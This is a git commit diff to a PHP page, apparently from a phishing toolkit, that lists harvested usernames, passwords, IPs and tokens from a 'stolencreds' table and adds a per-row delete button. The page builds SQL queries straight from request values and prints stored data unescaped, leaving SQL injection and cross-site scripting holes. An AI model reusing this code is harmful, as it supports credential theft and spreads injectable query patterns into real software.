b224de1f69b2f6d4699a1c4e2456a29a0e881c76
Curtis Brazzell <curtbraz@gmail.com>
2018-09-12 13:18:23 -0400

    Update index.php

--- results/index.php
+++ results/index.php
@@ -54,7 +54,7 @@ div.table-title {
   box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
   animation: float 5s infinite;
 }
- 
+
 th {
   color:#FFFFFF;
   background:#d12128;
@@ -71,12 +71,12 @@ th {
 th:first-child {
   border-top-left-radius:3px;
 }
- 
+
 th:last-child {
   border-top-right-radius:3px;
   border-right:none;
 }
-  
+
 tr {
   border-top: 1px solid #C1C3D1;
   border-bottom-: 1px solid #C1C3D1;
@@ -85,14 +85,14 @@ tr {
   font-weight:normal;
   text-shadow: 0 1px 1px rgba(256, 256, 256, 0.1);
 }
- 
+
 tr:hover td {
   background:#4E5066;
   color:#FFFFFF;
   border-top: 1px solid #22262e;
   border-bottom: 1px solid #22262e;
 }
- 
+
 tr:first-child {
   border-top:none;
 }
@@ -100,11 +100,11 @@ tr:first-child {
 tr:last-child {
   border-bottom:none;
 }
- 
+
 tr:nth-child(odd) td {
   background:#EBEBEB;
 }
- 
+
 tr:nth-child(odd):hover td {
   background:#4E5066;
 }
@@ -112,11 +112,11 @@ tr:nth-child(odd):hover td {
 tr:last-child td:first-child {
   border-bottom-left-radius:3px;
 }
- 
+
 tr:last-child td:last-child {
   border-bottom-right-radius:3px;
 }
- 
+
 td {
   background:#FFFFFF;
   padding:10px;
@@ -212,11 +212,11 @@ td.input input {
     -webkit-box-sizing: border-box;
 }
 
-    </style>      
+    </style>
 </HEAD>
 <BODY>
 <CENTER>
-<?php 
+<?php
 
 // Read Database Connection Variables
 require_once '../dbconfig.php';
@@ -240,7 +240,7 @@ $result1 = $conn->query($sql1);
 // Show Project Drop Down Selection
 ?>
     <h2><font color="#FFFFFF">Select Project</FONT></h2>
-<FORM METHOD="POST" ACTION="<?php echo $PHP_SELF;?>">
+<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
 <SELECT NAME="project">
 
 <?php
@@ -260,18 +260,29 @@ echo "<option value=\"".$row1["location"]."\">".$row1["location"]."</option>";
 // If a Project is Selected Already After Posting to Self...
 if(isset($_REQUEST['project'])){ $project = $_REQUEST['project'];
 
-// Show Credentails for the Selected Project 
+if(isset($_REQUEST['DELETE'])){
+
+$timestamp = $_REQUEST['timestamp'];
+
+// Delete Row From Results
+$sqlrm = "DELETE FROM stolencreds WHERE location = '$project' and entered = '$timestamp';";
+$resultrm = $conn->query($sqlrm);
+
+}
+
+// Show Credentails for the Selected Project
 $sql = "SELECT * FROM stolencreds WHERE location = '$project';";
 $result = $conn->query($sql);
 
 ?>
     <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>
-<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH></TR>
+<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>DEL</TH></TR>
 <?php
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
-echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td></tr>";
+$inputfields = "<input type=\"hidden\" name=\"project\" value=\"".$project."\"><input type=\"hidden\" name=\"timestamp\" value=\"".$row['entered']."\">";
+echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["Token"]."</td><td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>";
     }
 
 printf($conn->error);
